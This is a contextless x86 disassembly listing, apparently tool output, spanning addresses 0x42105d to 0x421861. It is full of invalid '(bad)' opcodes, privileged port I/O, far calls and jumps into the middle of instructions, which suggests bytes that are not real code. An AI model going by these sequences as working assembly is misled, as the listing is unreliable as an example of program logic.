  42105d:	lea    edi,[esi-0x294c30a7]
  421063:	cmp    esp,DWORD PTR [edi-0x9dd8be5]
  421069:	retf   0x7470
  42106c:	stos   BYTE PTR es:[edi],al
  42106d:	in     eax,0x31
  42106f:	loopne 0x4210e3
  421071:	pop    esp
  421072:	jle    0x4210d6
  421074:	mov    al,ds:0x51c2118d
  421079:	pop    ss
  42107a:	pop    ebx
  42107b:	retf   0x5927
  42107e:	aaa    
  42107f:	clc    
  421080:	fisub  WORD PTR [ebx+0x41]
  421083:	xor    DWORD PTR [esi+ecx*2],eax
  421086:	neg    DWORD PTR [edi+0x52]
  421089:	adc    ecx,0x92a3ed11
  42108f:	popf   
  421090:	call   0xe094:0xb7480b6f
  421097:	sbb    eax,0x5740a903
  42109c:	pop    es
  42109d:	ficomp WORD PTR [ebx]
  42109f:	mov    ah,0x61
  4210a1:	push   ecx
  4210a2:	push   cs
  4210a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210a4:	aaa    
  4210a5:	cdq    
  4210a6:	mov    BYTE PTR [ebp+0x14cc2496],dh
  4210ac:	loope  0x42108f
  4210ae:	mov    al,0xf3
  4210b0:	dec    esp
  4210b1:	ins    BYTE PTR es:[edi],dx
  4210b2:	xchg   BYTE PTR [eax],ch
  4210b4:	out    dx,eax
  4210b5:	jbe    0x421094
  4210b7:	test   dh,0x4a
  4210ba:	call   0x602d:0x8abaadd
  4210c1:	inc    ebx
  4210c2:	xchg   esp,edx
  4210c4:	xor    ch,ah
  4210c6:	lahf   
  4210c7:	call   0x4376124e
  4210cc:	shl    DWORD PTR [eax-0x30],0x4f
  4210d0:	dec    edi
  4210d1:	xor    DWORD PTR [ecx],ebp
  4210d3:	icebp  
  4210d4:	pop    esp
  4210d5:	fmul   QWORD PTR [ecx-0x7682f1d8]
  4210db:	pop    ecx
  4210dc:	in     al,dx
  4210dd:	cs add eax,0x42d1b7a8
  4210e3:	xor    ebp,eax
  4210e5:	out    0xba,eax
  4210e7:	mov    BYTE PTR [ebx-0x65d5afbd],0xbf
  4210ee:	retf   0x26ca
  4210f1:	loopne 0x42110f
  4210f3:	std    
  4210f4:	cmp    al,0xa
  4210f6:	icebp  
  4210f7:	cmp    dl,cl
  4210f9:	mov    edx,0xf2e3f680
  4210fe:	jbe    0x421129
  421100:	mov    ecx,0x5c57515d
  421105:	dec    eax
  421106:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421107:	loopne 0x421120
  421109:	jo     0x4210d9
  42110b:	mov    ecx,0x2e49249a
  421110:	or     dh,BYTE PTR [ebp+0x6acd06d0]
  421116:	sub    esi,DWORD PTR ds:0x2bfdee07
  42111d:	call   0xde5861bd
  421122:	push   esi
  421123:	push   ebp
  421124:	aaa    
  421125:	mov    esi,0xe50d8cbb
  42112a:	xor    DWORD PTR [edx],0x3b1c8e0c
  421130:	lahf   
  421131:	or     al,0x31
  421133:	out    0xde,eax
  421135:	ds lahf 
  421137:	and    DWORD PTR [edi],0x312261c9
  42113d:	stos   DWORD PTR es:[edi],eax
  42113e:	cli    
  42113f:	fistp  WORD PTR [esi]
  421141:	stos   BYTE PTR es:[edi],al
  421142:	jns    0x4210c5
  421144:	call   DWORD PTR [edi+0x620423a6]
  42114a:	sbb    BYTE PTR [edi-0x72],dh
  42114d:	sahf   
  42114e:	jmp    0x6038cb4b
  421153:	mov    ecx,0x1db84e51
  421158:	test   al,0x65
  42115a:	fldcw  WORD PTR ds:0xb076ef50
  421160:	pusha  
  421161:	xchg   edi,eax
  421162:	cld    
  421163:	adc    eax,0xbff2a89c
  421168:	add    eax,0x63e8198
  42116d:	inc    ecx
  42116e:	xchg   edx,eax
  42116f:	sti    
  421170:	out    0xf3,eax
  421172:	(bad)  [edi-0x6d]
  421175:	jbe    0x4211e5
  421177:	dec    edi
  421178:	ss dec eax
  42117a:	push   ebp
  42117b:	mov    bh,BYTE PTR [edi]
  42117d:	add    BYTE PTR [eax],al
  42117f:	add    BYTE PTR [eax],al
  421181:	add    BYTE PTR [edi+0x5b2a13cf],al
  421187:	(bad)  
  421188:	mov    edi,0x5549c1ef
  42118d:	cmp    BYTE PTR [edx-0x79],al
  421190:	push   0x18b98be
  421195:	add    bl,dh
  421197:	add    al,0x0
  421199:	add    BYTE PTR [ecx-0x42],bl
  42119c:	dec    ebp
  42119d:	outs   dx,DWORD PTR ds:[esi]
  42119e:	mov    ebp,0xd412dab0
  4211a3:	shl    BYTE PTR [edx+0x2044a472],0x68
  4211aa:	icebp  
  4211ab:	pushf  
  4211ac:	sbb    eax,0x6ffd5d41
  4211b1:	sahf   
  4211b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211b3:	loopne 0x421228
  4211b5:	fild   DWORD PTR [edi]
  4211b7:	test   al,0xc5
  4211b9:	repnz xor al,BYTE PTR [eax]
  4211bc:	dec    esi
  4211bd:	arpl   bp,bx
  4211bf:	retf   0xaa9
  4211c2:	fild   QWORD PTR [ecx-0x1a05f3f2]
  4211c8:	xlat   BYTE PTR ds:[ebx]
  4211c9:	jecxz  0x421206
  4211cb:	cli    
  4211cc:	mov    edx,0xb1fee004
  4211d1:	and    DWORD PTR [ecx+0x25b04282],ebx
  4211d7:	xor    al,0xb9
  4211d9:	jae    0x4211d8
  4211db:	push   es
  4211dc:	popa   
  4211dd:	out    0x3d,al
  4211df:	dec    eax
  4211e0:	jge    0x421202
  4211e2:	dec    ecx
  4211e3:	(bad)  
  4211e4:	cs retf 0x9a28
  4211e8:	cmp    DWORD PTR [bx+di],edi
  4211eb:	sar    bl,1
  4211ed:	pop    edx
  4211ee:	retf   0x3d35
  4211f1:	dec    eax
  4211f2:	push   edi
  4211f3:	popf   
  4211f4:	dec    edi
  4211f5:	sti    
  4211f6:	in     eax,0xa0
  4211f8:	xchg   esi,eax
  4211f9:	mov    cl,0x86
  4211fb:	(bad)  [eax-0x772baae8]
  421201:	push   edx
  421202:	mov    ah,0x3c
  421204:	mov    DWORD PTR ds:0xce40f413,esp
  42120a:	js     0x42125c
  42120c:	mov    ah,0xe
  42120e:	icebp  
  42120f:	sub    ecx,DWORD PTR [edx+0x572464aa]
  421215:	out    0xcd,al
  421217:	pushf  
  421218:	cmp    eax,esi
  42121a:	cmp    DWORD PTR [esp+eax*4],edi
  42121d:	inc    edx
  42121e:	shr    DWORD PTR [esi+0x3c],0x7f
  421222:	int3   
  421223:	stc    
  421224:	nop
  421225:	cwde   
  421226:	arpl   sp,cx
  421228:	js     0x421224
  42122a:	scas   al,BYTE PTR es:[edi]
  42122b:	jecxz  0x421275
  42122d:	inc    ecx
  42122e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42122f:	jnp    0x42129e
  421231:	nop
  421232:	xor    DWORD PTR ss:[ebp+0x71],ecx
  421236:	popf   
  421237:	in     eax,dx
  421238:	pop    ecx
  421239:	js     0x4211da
  42123b:	inc    edx
  42123c:	enter  0x65c6,0xfd
  421240:	pusha  
  421241:	inc    ebp
  421242:	dec    ebp
  421243:	lods   eax,DWORD PTR ds:[esi]
  421244:	and    al,0x87
  421246:	sbb    ah,bh
  421248:	add    al,0x65
  42124a:	jnp    0x42126b
  42124c:	xchg   ebx,eax
  42124d:	cmp    dl,BYTE PTR [edi-0x4f]
  421250:	add    ah,cl
  421252:	xor    ebp,ecx
  421254:	sahf   
  421255:	mov    bl,0xdb
  421257:	push   edx
  421258:	sub    al,0xe2
  42125a:	cmp    edi,DWORD PTR [ebx-0x26a023a7]
  421260:	mov    bl,0x61
  421262:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421263:	clc    
  421264:	or     eax,0xf66ca23c
  421269:	xchg   DWORD PTR [edi],esp
  42126b:	pop    edx
  42126c:	mov    ah,BYTE PTR [edi-0x65]
  42126f:	mov    esp,0xaa50cee2
  421274:	inc    edi
  421275:	mov    ah,0x7e
  421277:	sub    al,0x95
  421279:	outs   dx,BYTE PTR ds:[esi]
  42127a:	or     BYTE PTR [esi],al
  42127c:	in     eax,0x9c
  42127e:	inc    eax
  42127f:	loop   0x42120c
  421281:	inc    esp
  421282:	popf   
  421283:	int    0x9e
  421285:	retf   0x21d7
  421288:	push   ecx
  421289:	in     eax,dx
  42128a:	pop    ds
  42128b:	mov    cl,0xfa
  42128d:	stos   BYTE PTR es:[edi],al
  42128e:	lahf   
  42128f:	ja     0x4212a6
  421291:	sbb    BYTE PTR [ebx],0xb
  421294:	xchg   ebx,eax
  421295:	fst    QWORD PTR [edx]
  421297:	leave  
  421298:	dec    eax
  421299:	xchg   edi,eax
  42129a:	sub    BYTE PTR [ecx-0x4d83071f],0xc
  4212a1:	sub    BYTE PTR cs:[eax-0x2],al
  4212a5:	cmp    esi,DWORD PTR ds:0x1d41b204
  4212ab:	cdq    
  4212ac:	jle    0x421296
  4212ae:	mov    ecx,0x49e4ca10
  4212b3:	pop    esp
  4212b4:	mov    ch,0x56
  4212b6:	mov    cl,0x5a
  4212b8:	jmp    0x421259
  4212ba:	sbb    edx,DWORD PTR [ebx]
  4212bc:	mov    al,ds:0x970114e1
  4212c1:	test   DWORD PTR [eax],esi
  4212c3:	jbe    0x4212e5
  4212c5:	xor    cl,BYTE PTR [ebx+0x62]
  4212c8:	inc    edx
  4212c9:	push   cs
  4212ca:	fst    QWORD PTR [esi]
  4212cc:	lds    edi,FWORD PTR [ebx]
  4212ce:	mov    dl,0x34
  4212d0:	scas   al,BYTE PTR es:[edi]
  4212d1:	pop    ecx
  4212d2:	int    0xb7
  4212d4:	pop    edx
  4212d5:	mov    bl,0xdd
  4212d7:	out    0xcf,al
  4212d9:	popf   
  4212da:	and    edi,DWORD PTR [ebx+eiz*4]
  4212dd:	add    BYTE PTR [edi],dl
  4212df:	(bad)  
  4212e0:	int    0xa6
  4212e2:	mov    ecx,0x97fb4e32
  4212e7:	rcr    BYTE PTR [ecx+eax*4],0xa7
  4212eb:	dec    edx
  4212ec:	push   esi
  4212ed:	icebp  
  4212ee:	xor    DWORD PTR [edi-0xf68a9b2],ebx
  4212f4:	retf   
  4212f5:	dec    cl
  4212f7:	jl     0x421340
  4212f9:	pop    edx
  4212fa:	add    esi,ecx
  4212fc:	xchg   ebp,eax
  4212fd:	imul   BYTE PTR [esi+0x55dd5044]
  421303:	jl     0x4212a5
  421305:	jo     0x42130c
  421307:	mov    DWORD PTR ds:0xd0b79dde,ebx
  42130d:	cmp    DWORD PTR [ebp-0x62],edi
  421310:	cs in  al,0x2e
  421313:	call   0xfebf1039
  421318:	mov    al,ds:0x3a18dabf
  42131d:	nop
  42131e:	lods   al,BYTE PTR ds:[esi]
  42131f:	out    0x86,eax
  421321:	xor    eax,0x984c7ed7
  421326:	pop    ecx
  421327:	mov    bl,BYTE PTR [eax]
  421329:	(bad)  
  42132c:	and    BYTE PTR [ebx],0xa8
  42132f:	jle    0x421366
  421331:	imul   esp,DWORD PTR [ebx+0x2059e96e],0xbcf2c8d3
  42133b:	ds out dx,eax
  42133d:	out    dx,al
  42133e:	dec    ecx
  42133f:	arpl   WORD PTR [ebp-0x1273e92a],ax
  421345:	sbb    eax,0xc27720ed
  42134a:	test   BYTE PTR [eax+0x6d],al
  42134d:	mov    bl,0x5
  42134f:	mov    cl,BYTE PTR [eax]
  421351:	cs mov dl,0x98
  421354:	shl    DWORD PTR [ebx-0x16],cl
  421357:	mov    esi,DWORD PTR [ecx]
  421359:	sbb    DWORD PTR [edi-0x80],edi
  42135c:	mov    ebx,0x5144025a
  421361:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421362:	mov    dl,0x34
  421364:	add    BYTE PTR [edx-0x8],0xf0
  421368:	das    
  421369:	bound  ebx,QWORD PTR [ebx+0x27bd422]
  42136f:	or     DWORD PTR [esi],ebp
  421371:	mov    bh,0xe0
  421373:	jecxz  0x4213a5
  421375:	sbb    BYTE PTR [edx+0x24],dh
  421378:	xchg   edx,eax
  421379:	jns    0x421361
  42137b:	mov    ds:0x4d851e46,eax
  421380:	jmp    0x5dde:0x845571df
  421387:	xchg   esi,eax
  421388:	jl     0x42134d
  42138a:	mov    ds:0x689433f3,eax
  42138f:	into   
  421390:	dec    esp
  421391:	shl    eax,0xb6
  421394:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421395:	not    DWORD PTR [esi]
  421397:	jg     0x421378
  421399:	(bad)  [ecx+0x2562d571]
  42139f:	inc    edi
  4213a0:	pop    edx
  4213a1:	jno    0x4213d3
  4213a3:	or     bh,BYTE PTR [edx+0x6a873e63]
  4213a9:	out    0x10,al
  4213ab:	add    bl,dh
  4213ad:	and    DWORD PTR [edx-0x67],ecx
  4213b0:	dec    ebp
  4213b1:	enter  0xa30,0x3c
  4213b5:	stc    
  4213b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213b7:	mov    ecx,0x31f2eabe
  4213bc:	leave  
  4213bd:	pop    ecx
  4213be:	stos   BYTE PTR es:[edi],al
  4213bf:	sub    BYTE PTR [ebp-0x242388df],dh
  4213c5:	sub    eax,0xc599cf75
  4213ca:	adc    bh,BYTE PTR [eax]
  4213cc:	ds mov esi,ecx
  4213cf:	inc    esi
  4213d0:	or     BYTE PTR [edi+eax*1+0x7b039741],dl
  4213d7:	ins    DWORD PTR es:[edi],dx
  4213d8:	mov    bh,dl
  4213da:	sbb    edx,DWORD PTR [edx]
  4213dc:	push   0x126c7037
  4213e1:	push   0x331f7073
  4213e6:	loope  0x421456
  4213e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213e9:	lds    ebx,FWORD PTR ds:0xcaba4524
  4213ef:	add    BYTE PTR [esi],cl
  4213f1:	push   edx
  4213f2:	xor    edx,DWORD PTR [bx+0x35]
  4213f6:	mov    al,ds:0xf2991235
  4213fb:	mov    cs,WORD PTR [esi+ebx*4]
  4213fe:	or     al,0xf0
  421400:	fcmovbe st,st(3)
  421402:	fcomp  st(0)
  421404:	je     0x42147e
  421406:	or     eax,0xd482e855
  42140b:	int    0x84
  42140d:	xor    ecx,DWORD PTR [ebx+esi*2-0x32]
  421411:	cmc    
  421412:	dec    ebx
  421413:	jle    0x421490
  421415:	out    dx,al
  421416:	jmp    0x42143b
  421418:	(bad)  
  421419:	push   esp
  42141a:	test   DWORD PTR [ebp-0x46],0x7b9d418c
  421421:	push   esp
  421422:	aad    0x17
  421424:	cmp    al,0x43
  421426:	in     al,dx
  421427:	lahf   
  421428:	mov    eax,ds:0xdb002447
  42142d:	sub    BYTE PTR [ebx],ah
  42142f:	sbb    ecx,DWORD PTR [edi+0x4aed8d38]
  421435:	(bad)  
  421436:	retf   0xc856
  421439:	mov    cl,0x2b
  42143b:	push   DWORD PTR [edi-0x59]
  42143e:	xchg   BYTE PTR [eax+0x7281da56],dl
  421444:	in     al,0x42
  421446:	pop    edx
  421447:	cmp    eax,0x31fdd1ee
  42144c:	jmp    0x7e7f141c
  421451:	sbb    al,0x3b
  421453:	jecxz  0x421481
  421455:	outs   dx,DWORD PTR ds:[esi]
  421456:	fwait
  421457:	imul   edx,DWORD PTR [ebp+0x58],0xffffff9c
  42145b:	aam    0x92
  42145d:	jecxz  0x421407
  42145f:	pop    edi
  421460:	mov    ecx,0x5dfeb1b6
  421465:	pop    edi
  421466:	mov    al,ds:0xbe034207
  42146b:	inc    ebp
  42146c:	cmp    eax,0xc86d1625
  421471:	out    dx,eax
  421472:	popa   
  421473:	shl    BYTE PTR [edi+0x42cabf28],1
  421479:	xor    ebx,DWORD PTR [edx]
  42147b:	ins    DWORD PTR es:[edi],dx
  42147c:	cmp    edi,esi
  42147e:	adc    ecx,ecx
  421480:	cdq    
  421481:	xchg   esi,eax
  421482:	pop    dx
  421484:	mov    WORD PTR [edx+0x6ae38859],?
  42148a:	mov    edi,0x8d36f54c
  42148f:	add    ebp,DWORD PTR [eax+ebx*8]
  421492:	pop    es
  421493:	push   ds
  421494:	adc    esp,DWORD PTR [ecx]
  421496:	pop    ds
  421497:	pushf  
  421498:	ja     0x421462
  42149a:	(bad)  
  42149b:	pop    es
  42149c:	inc    eax
  42149d:	push   ss
  42149e:	lods   eax,DWORD PTR ds:[esi]
  42149f:	dec    esp
  4214a0:	add    al,0xd1
  4214a2:	loopne 0x4214b8
  4214a4:	repnz xor DWORD PTR [eax+esi*2-0x6b9b1483],esp
  4214ac:	(bad)  
  4214ad:	js     0x4214f5
  4214af:	or     al,0x31
  4214b1:	add    bh,BYTE PTR [eax-0xe]
  4214b4:	stos   BYTE PTR es:[edi],al
  4214b5:	mov    eax,ds:0x5ebcd71d
  4214ba:	mov    ch,0xc8
  4214bc:	cmp    bh,BYTE PTR [eax-0x4b]
  4214bf:	pop    ebx
  4214c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214c1:	push   edi
  4214c2:	adc    BYTE PTR [ecx-0x60692af3],0x8f
  4214c9:	adc    bh,al
  4214cb:	ja     0x4214fa
  4214cd:	(bad)
  4214d0:	ins    BYTE PTR es:[edi],dx
  4214d1:	sub    al,0x79
  4214d3:	add    DWORD PTR [edx],0xffffffb2
  4214d6:	out    dx,eax
  4214d7:	lods   eax,DWORD PTR ds:[esi]
  4214d8:	mov    ds:0x2074ff75,eax
  4214dd:	cld    
  4214de:	aad    0xd0
  4214e0:	push   ebx
  4214e1:	call   0xac23c459
  4214e6:	add    DWORD PTR [edi+0x778fd2ed],edx
  4214ec:	and    ch,BYTE PTR [esi-0x18f1de28]
  4214f2:	xchg   esp,eax
  4214f3:	inc    edx
  4214f4:	call   0x42b3:0x9f324b3d
  4214fb:	pop    es
  4214fc:	test   BYTE PTR [esi+0x7a],dl
  4214ff:	mov    ecx,0xb188b8bd
  421504:	js     0x4214c5
  421506:	mov    dl,0xde
  421508:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421509:	test   eax,0x792ac3a6
  42150e:	enter  0x3840,0x33
  421512:	sbb    DWORD PTR [edx-0x12fc2230],eax
  421518:	not    DWORD PTR [ecx]
  42151a:	or     DWORD PTR [esi],edx
  42151c:	gs jno 0x421532
  42151f:	push   ss
  421520:	mov    ebx,0xbe902e66
  421525:	test   ebp,0xf75b821c
  42152b:	(bad)  
  42152c:	cmp    DWORD PTR [edi+0x2b],eax
  42152f:	xchg   esp,edx
  421531:	les    esi,FWORD PTR [eax-0x67]
  421534:	mov    edx,0x360d3612
  421539:	mov    eax,0xbf6d0e05
  42153e:	xor    BYTE PTR [ebx-0x67e70d14],bh
  421544:	sbb    DWORD PTR [esi+0x24],esp
  421547:	jmp    0x7c229e4e
  42154c:	lods   eax,DWORD PTR ds:[esi]
  42154d:	dec    eax
  42154e:	mov    ds:0x23e6dced,eax
  421553:	pop    edx
  421554:	ds mov dh,0xaf
  421557:	cmovnp edi,DWORD PTR [edx+0x45]
  42155b:	ret    
  42155c:	jmp    0xf4a7:0xcd98d418
  421563:	adc    ch,0xc3
  421566:	popf   
  421567:	popf   
  421568:	xchg   DWORD PTR [edx],eax
  42156a:	jne    0x421591
  42156c:	shr    BYTE PTR [esi-0x46],1
  42156f:	lahf   
  421570:	xchg   ebx,eax
  421571:	mul    BYTE PTR [ebp+eiz*4+0x23]
  421575:	or     al,0x83
  421577:	push   eax
  421578:	aam    0x7b
  42157a:	or     BYTE PTR [ecx],ch
  42157c:	jnp    0x421596
  42157e:	xor    ecx,DWORD PTR [edx-0x70e185ac]
  421584:	cmp    al,0x44
  421586:	loopne 0x4215ca
  421588:	aaa    
  421589:	or     BYTE PTR [ebp+0x45898c1e],bl
  42158f:	loop   0x4215b2
  421591:	push   ss
  421592:	mov    al,BYTE PTR [ebp-0x3]
  421595:	hlt    
  421596:	xchg   ebx,eax
  421597:	push   esi
  421598:	inc    edi
  421599:	jge    0x42155b
  42159b:	cmp    bl,al
  42159d:	bound  ebx,QWORD PTR [edi+eax*1-0x4ed5959e]
  4215a4:	jnp    0x421527
  4215a6:	mov    DWORD PTR [edx+0x7a156024],ebp
  4215ac:	push   ds
  4215ad:	jns    0x4215be
  4215af:	lock retf 0xf683
  4215b3:	shr    DWORD PTR [edi+edi*2+0x7b],0x9e
  4215b8:	jmp    0xf0e96761
  4215bd:	clc    
  4215be:	add    al,0x24
  4215c0:	fdiv   DWORD PTR [esi-0x72]
  4215c3:	xchg   DWORD PTR [ecx+0x70f6a3f6],ebx
  4215c9:	jnp    0x421552
  4215cb:	mov    esi,0x8c3fa35e
  4215d0:	stos   DWORD PTR es:[edi],eax
  4215d1:	mov    bl,0x52
  4215d3:	push   0x6a
  4215d5:	(bad)  
  4215d6:	in     eax,dx
  4215d7:	inc    ecx
  4215d8:	push   0x7ed501fb
  4215dd:	(bad)  
  4215de:	push   edx
  4215df:	retf   0xc08
  4215e2:	popa   
  4215e3:	into   
  4215e4:	adc    BYTE PTR ds:0xb5555007,bh
  4215ea:	cmp    eax,esi
  4215ec:	sub    ch,BYTE PTR [edi-0x6a]
  4215ef:	adc    eax,0x7312e095
  4215f4:	mov    BYTE PTR [eax],ah
  4215f6:	imul   ebx,ebp,0xffffffac
  4215f9:	or     DWORD PTR [ebp-0x21],ecx
  4215fc:	xor    al,BYTE PTR [esi+0x2d9338eb]
  421602:	mov    esp,0xb0395a76
  421607:	pop    ds
  421608:	imul   esp,DWORD PTR [edi-0x50fbfd06],0x497028e
  421612:	add    ecx,DWORD PTR [ebx+ebx*8+0x22]
  421616:	inc    edi
  421617:	loope  0x421643
  421619:	out    0xe3,eax
  42161b:	push   ss
  42161c:	shl    BYTE PTR [edi-0x62a5a7a9],1
  421622:	xor    DWORD PTR [ecx+edi*4+0x6e],edi
  421626:	xchg   esi,eax
  421627:	jbe    0x421672
  421629:	jne    0x4215f9
  42162b:	lahf   
  42162c:	sbb    dh,BYTE PTR [eax+0x4f675e1a]
  421632:	into   
  421633:	inc    edx
  421634:	jbe    0x42162a
  421636:	(bad)  
  421637:	fs jne 0x421654
  42163a:	fldz   
  42163c:	std    
  42163d:	dec    esp
  42163e:	mov    al,ds:0x8d751988
  421643:	inc    ecx
  421644:	aam    0x92
  421646:	mov    ds,WORD PTR [ebx]
  421648:	and    al,0x28
  42164a:	jge    0x4215dc
  42164c:	fist   WORD PTR [edx]
  42164e:	fwait
  42164f:	inc    ecx
  421650:	sbb    esi,DWORD PTR [eax]
  421652:	mov    ds:0x1378b8da,al
  421657:	ret    
  421658:	nop
  421659:	mov    bh,0xe8
  42165b:	mov    bh,0xc6
  42165d:	ins    BYTE PTR es:[edi],dx
  42165e:	cs cmp eax,0x563171ce
  421664:	mov    ebp,0x2a049d69
  421669:	daa    
  42166a:	je     0x421696
  42166c:	repz dec ebx
  42166e:	mov    ebx,0xd741aba4
  421673:	cmc    
  421674:	push   ecx
  421675:	imul   edi,DWORD PTR [esi],0x3ed5128a
  42167b:	fnstsw WORD PTR [ebp-0x63647e36]
  421681:	les    edi,FWORD PTR ds:0x7495f3f2
  421687:	shl    ebx,cl
  421689:	fistp  WORD PTR [ebx]
  42168b:	or     eax,0x1a
  421690:	add    BYTE PTR [eax],al
  421692:	sti    
  421693:	and    al,0xdc
  421695:	es (bad) 
  421698:	sti    
  421699:	std    
  42169a:	sbb    ch,BYTE PTR [edx]
  42169c:	adc    eax,0xfcbca3c6
  4216a1:	xor    DWORD PTR [ebx-0xcfffe70],ecx
  4216a7:	add    al,0x0
  4216a9:	add    bl,ch
  4216ab:	ret    0x5507
  4216ae:	repz repz xchg ebp,ecx
  4216b2:	xchg   ebx,eax
  4216b3:	sbb    edi,DWORD PTR [bx-0x481c]
  4216b8:	inc    ecx
  4216b9:	fild   DWORD PTR [ebx+edx*8-0x80]
  4216bd:	ss in  al,dx
  4216bf:	dec    ebx
  4216c0:	cdq    
  4216c1:	mov    dl,BYTE PTR ds:0x1b9cccd8
  4216c7:	mov    esi,0x28830c86
  4216cc:	mov    ds:0x469a0884,al
  4216d1:	jge    0x42170a
  4216d3:	dec    ecx
  4216d4:	mov    ebp,0x103a48de
  4216d9:	sub    al,0xb4
  4216db:	fwait
  4216dc:	xor    dl,BYTE PTR [edx+0x29]
  4216df:	shl    ebx,0xa2
  4216e2:	push   DWORD PTR [ecx+0x1c]
  4216e5:	adc    DWORD PTR [ecx],esp
  4216e7:	fisub  WORD PTR [eax]
  4216e9:	inc    ax
  4216eb:	pop    ebx
  4216ec:	or     dh,BYTE PTR [edx+0x5f]
  4216ef:	test   ecx,0x4cf3a161
  4216f5:	(bad)  
  4216f6:	out    dx,eax
  4216f7:	xor    ebx,DWORD PTR [edi+esi*1+0x35ddd5db]
  4216fe:	shl    DWORD PTR [edi+0x4f],0x2b
  421702:	lods   eax,DWORD PTR ds:[esi]
  421703:	dec    edi
  421704:	pop    edi
  421705:	call   0x1deee849
  42170a:	scas   eax,DWORD PTR es:[edi]
  42170b:	(bad)  
  42170c:	cld    
  42170d:	mov    dl,BYTE PTR [ebp+0x44195226]
  421713:	xchg   edx,eax
  421714:	popf   
  421715:	ss cmp eax,0xf32d98ba
  42171b:	jne    0x421708
  42171d:	sbb    eax,0xeb26073f
  421722:	pop    es
  421723:	hlt    
  421724:	lods   al,BYTE PTR ds:[esi]
  421725:	adc    esi,DWORD PTR [ebx-0x63]
  421728:	or     DWORD PTR [ebp+0x68f9755c],ebx
  42172e:	outs   dx,DWORD PTR ds:[esi]
  42172f:	stc    
  421730:	test   al,0xf0
  421732:	sbb    al,0x8c
  421734:	xchg   esi,eax
  421735:	cmp    eax,0xbaf361c7
  42173a:	rcl    BYTE PTR [esi],1
  42173c:	pop    ss
  42173d:	mov    ss,WORD PTR [ecx]
  42173f:	jne    0x42173c
  421741:	inc    edx
  421742:	repnz clc 
  421744:	dec    eax
  421745:	repz mov bh,0x21
  421748:	push   ebx
  421749:	or     bh,ch
  42174b:	fistp  QWORD PTR [ecx+0x2d8cd98c]
  421751:	push   esp
  421752:	mov    dh,0xc
  421754:	das    
  421755:	jg     0x421710
  421757:	mov    WORD PTR [eax],gs
  421759:	hlt    
  42175a:	jbe    0x42173c
  42175c:	mov    DWORD PTR [eax-0x1ae59443],edx
  421762:	(bad)  
  421763:	push   ebp
  421764:	pop    esp
  421765:	push   ss
  421766:	ret    
  421767:	test   DWORD PTR [edi],edi
  421769:	cs xor ebx,eax
  42176c:	add    al,0x6f
  42176e:	jmp    0x98da:0x39e0f25d
  421775:	ja     0x4216ff
  421777:	stc    
  421778:	adc    al,0x6d
  42177a:	dec    eax
  42177b:	cmp    DWORD PTR [esp+esi*2],esp
  42177e:	call   0xa2ba:0xf43c0167
  421785:	xchg   BYTE PTR [esi+eiz*8-0xa],dh
  421789:	lock mov DWORD PTR [ebp+0x56],esp
  42178d:	out    0xf5,al
  42178f:	ror    ebp,1
  421791:	pop    es
  421792:	add    eax,0xe6e0aaec
  421797:	dec    esp
  421798:	jb     0x4217e6
  42179a:	stos   DWORD PTR es:[edi],eax
  42179b:	jno    0x42173f
  42179d:	out    0xbd,al
  42179f:	fdiv   QWORD PTR [ebp+ebp*4-0x4]
  4217a3:	mov    ebx,0x3ce49c62
  4217a8:	je     0x4217aa
  4217aa:	pop    eax
  4217ab:	sub    cl,BYTE PTR [ebp-0x9]
  4217ae:	inc    edi
  4217af:	and    eax,0xa4148895
  4217b4:	das    
  4217b5:	jo     0x421806
  4217b7:	pop    ecx
  4217b8:	mov    ?,WORD PTR [ebp+0x6f604219]
  4217be:	test   BYTE PTR ds:0xcde50cba,dh
  4217c4:	sbb    BYTE PTR [ebx],0x3
  4217c7:	fadd   DWORD PTR [edi+0x1]
  4217ca:	dec    DWORD PTR [edx]
  4217cc:	adc    bh,dh
  4217ce:	rcr    BYTE PTR [ebp+ebx*4-0x58],cl
  4217d2:	icebp  
  4217d3:	pop    ebp
  4217d4:	(bad)  
  4217d5:	pop    eax
  4217d6:	jl     0x42178e
  4217d8:	je     0x4217ef
  4217da:	sbb    BYTE PTR [ebx-0x6b],dl
  4217dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217de:	repz out 0x3a,eax
  4217e1:	fidiv  DWORD PTR [ebx-0x1d]
  4217e4:	gs add eax,0xc4395f0f
  4217ea:	xchg   BYTE PTR [ebp+0x2d097467],ah
  4217f0:	popa   
  4217f1:	xchg   ebp,eax
  4217f2:	mov    ebp,0x6545886d
  4217f7:	ja     0x4217cf
  4217f9:	retf   0xbbe3
  4217fc:	mov    eax,0xa15aa12a
  421801:	xor    DWORD PTR [edi+ecx*8+0x49],ecx
  421805:	loopne 0x421810
  421807:	mov    bh,0x77
  421809:	add    eax,0x1eccb81e
  42180e:	div    DWORD PTR [ebx-0x20]
  421811:	cmp    ah,BYTE PTR [esp+eax*8+0x1fc93e6]
  421818:	sbb    bh,BYTE PTR [ecx]
  42181a:	lods   al,BYTE PTR ds:[esi]
  42181b:	mov    al,ds:0x8899fba2
  421820:	stos   DWORD PTR es:[edi],eax
  421821:	pop    esi
  421822:	and    DWORD PTR [esi-0x65d89d20],eax
  421828:	fldenv [ebx+0x54]
  42182b:	das    
  42182c:	loope  0x42188c
  42182e:	dec    esi
  42182f:	out    dx,al
  421830:	mov    BYTE PTR [ecx-0x28],al
  421833:	sub    eax,0x2d766b7f
  421838:	retf   
  421839:	ins    BYTE PTR es:[edi],dx
  42183a:	int    0xd
  42183c:	push   cs
  42183d:	les    edi,FWORD PTR ds:0x74d5836d
  421843:	mov    ebp,0xe406c6b
  421848:	(bad)  
  42184c:	jge    0x421828
  42184e:	popa   
  42184f:	nop
  421850:	mov    esi,0xd30b0548
  421855:	lods   eax,DWORD PTR ds:[esi]
  421856:	js     0x42184c
  421858:	and    eax,DWORD PTR [bp+si-0x7a]
  42185c:	stc    
  42185d:	sbb    al,0x31
  42185f:	push   ecx
  421860:	ret    
  421861:	jno    0x42182e
